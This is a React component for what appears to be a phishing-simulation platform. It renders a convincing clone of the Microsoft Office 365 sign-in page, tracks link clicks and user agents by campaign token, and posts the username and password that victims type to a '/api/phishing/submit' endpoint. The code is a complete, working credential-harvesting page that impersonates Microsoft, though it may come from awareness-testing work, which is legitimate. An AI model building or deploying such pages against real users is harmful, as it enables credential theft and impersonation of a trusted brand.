import React, { useState, useEffect } from 'react';
import { useParams, useNavigate, useLocation } from 'react-router-dom';
import axios from 'axios';
import '../../App.css'; // Import global styles

const Office365Login = () => {
  const { template, token } = useParams();
  const navigate = useNavigate();
  const location = useLocation();

  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  // Get the token either from params or from the path
  const actualToken = token || (location.pathname === '/phish/office365/demo_phish_token' ? 'demo_phish_token' : null);

  useEffect(() => {
    const trackLinkClick = async () => {
      if (actualToken) {
        try {
          console.log('[FRONTEND LOG] Office365Login tracking click for token:', actualToken);
          await axios.post('/api/phishing/track-click', {
            token: actualToken,
            user_agent: navigator.userAgent,
          });
        } catch (err) {
          console.error('Failed to track link click:', err.response ? err.response.data : err.message);
        }
      } else {
        console.warn('[FRONTEND LOG] Office365Login: Token is undefined in useEffect for trackLinkClick.');
      }
    };
    if (actualToken) {
      trackLinkClick();
    }
  }, [actualToken]);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setError('');
    setIsLoading(true);

    console.log('[FRONTEND LOG] Office365Login: handleSubmit called. Token:', actualToken);

    if (!username || !password) {
      setError('Username and password are required.');
      setIsLoading(false);
      return;
    }

    // Special handling for demo token
    if (actualToken === 'demo_phish_token') {
      // For demo, navigate directly to success page with captured data
      navigate('/auth/success', {
        state: {
          capturedUsername: username,
          capturedPassword: password,
          capturedTimestamp: new Date().toISOString(),
          capturedIp: '127.0.0.1' // Demo IP
        }
      });
      return;
    }

    // Regular flow for real campaigns
    if (!actualToken) {
      setError('Submission failed: Tracking token is missing. Cannot proceed.');
      console.error('[FRONTEND LOG] Office365Login: Submission aborted because token is undefined or empty.');
      setIsLoading(false);
      return;
    }

    const payload = {
      token: actualToken,
      username: username,
      password: password,
    };

    try {
      const response = await axios.post('/api/phishing/submit', payload);

      if (response.data.success) {
        // For real campaigns, navigate to success page with data from backend
        navigate('/auth/success', {
          state: {
            capturedUsername: username,
            capturedPassword: password,
            capturedTimestamp: new Date().toISOString(),
            capturedIp: '127.0.0.1' // IP will be captured by backend in real scenarios
          }
        });
      } else {
        setError(response.data.message || 'Submission failed. Please try again.');
      }
    } catch (err) {
      console.error('Submission error:', err.response ? err.response.data : err.message);
      setError(err.response?.data?.message || 'An error occurred. Please try again.');
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div style={{ display: 'flex', flexDirection: 'column', justifyContent: 'center', alignItems: 'center', minHeight: '100vh', backgroundColor: '#f0f2f5', fontFamily: 'Segoe UI, sans-serif' }}>
      <div style={{ backgroundColor: 'white', padding: '40px', borderRadius: '8px', boxShadow: '0 4px 12px rgba(0,0,0,0.1)', width: '100%', maxWidth: '400px' }}>
        <img src="/microsoft_logo.svg" alt="Microsoft" style={{ display: 'block', margin: '0 auto 20px auto', height: '24px' }} />
        <h2 style={{ fontSize: '24px', fontWeight: '600', marginBottom: '10px', textAlign: 'left' }}>Sign in</h2>
        {error && <p style={{ color: 'red', marginBottom: '15px', fontSize: '14px' }}>{error}</p>}
        <form onSubmit={handleSubmit}>
          <div style={{ marginBottom: '20px' }}>
            <input
              type="email"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              placeholder="Email, phone, or Skype"
              disabled={isLoading}
              style={{ width: '100%', padding: '10px 12px', border: '1px solid #ccc', borderRadius: '4px', fontSize: '16px' }}
            />
          </div>
          <div style={{ marginBottom: '20px' }}>
            <input
              type="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder="Password"
              disabled={isLoading}
              style={{ width: '100%', padding: '10px 12px', border: '1px solid #ccc', borderRadius: '4px', fontSize: '16px' }}
            />
          </div>
          <div style={{ textAlign: 'right', marginBottom: '20px' }}>
            <a href="#" onClick={(ev) => ev.preventDefault()} style={{ color: '#0067b8', textDecoration: 'none', fontSize: '14px' }}>Forgot password?</a>
          </div>
          <button
            type="submit"
            disabled={isLoading || !actualToken}
            style={{ width: '100%', padding: '10px', backgroundColor: '#0067b8', color: 'white', border: 'none', borderRadius: '4px', cursor: 'pointer', fontSize: '16px', fontWeight: '600', opacity: (!actualToken || isLoading) ? 0.6 : 1 }}
          >
            {isLoading ? 'Signing in...' : 'Sign in'}
          </button>
          {!actualToken && <p style={{color: 'orange', fontSize: '12px', textAlign: 'center', marginTop: '10px'}}>Warning: Tracking token missing in URL.</p>}
        </form>
        <div style={{ marginTop: '30px', fontSize: '14px', textAlign: 'left' }}>
          No account? <a href="#" onClick={(ev) => ev.preventDefault()} style={{ color: '#0067b8', textDecoration: 'none' }}>Create one!</a>
        </div>
      </div>
      <div style={{ marginTop: '20px', fontSize: '13px', color: '#666' }}>
        <a href="#" onClick={(ev) => ev.preventDefault()} style={{ color: '#0067b8', textDecoration: 'none', marginRight: '15px' }}>Terms of use</a>
        <a href="#" onClick={(ev) => ev.preventDefault()} style={{ color: '#0067b8', textDecoration: 'none', marginRight: '15px' }}>Privacy & cookies</a>
        <a href="#" onClick={(ev) => ev.preventDefault()} style={{ color: '#0067b8', textDecoration: 'none' }}>...</a>
      </div>
    </div>
  );
};

export default Office365Login;